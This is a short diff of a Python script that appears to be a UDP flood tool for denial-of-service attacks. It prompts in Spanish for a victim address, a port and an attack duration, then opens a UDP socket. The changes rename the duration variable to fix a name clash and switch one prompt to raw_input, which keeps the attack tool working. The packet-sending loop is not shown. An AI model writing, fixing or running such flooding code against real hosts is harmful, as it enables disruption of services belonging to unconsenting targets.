@@ -11,11 +11,11 @@ from colorama import *
 def main():
         global victima
         global port
-        global tiempo
+        global tiempo1
         os.system("cls || clear")
-        victima = input("- Victima: ")
+        victima = raw_input("- Victima: ")
         port = int(input("- Puerto: "))
-        tiempo = int(input("- Tiempo De Ataque (Segundos): "))
+        tiempo1 = int(input("- Tiempo De Ataque (Segundos): "))
         os.system("cls || clear")
         UDP()
 
@@ -23,7 +23,7 @@ def UDP():
     puertoo = port
     randport=(True,False)[port==0]
     ip = victima
-    dur = tiempo
+    dur = tiempo1
     tiempo=(lambda:0,time.clock)[dur>0]
     tiempotion=(1,(tiempo()+dur))[dur>0]
     sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
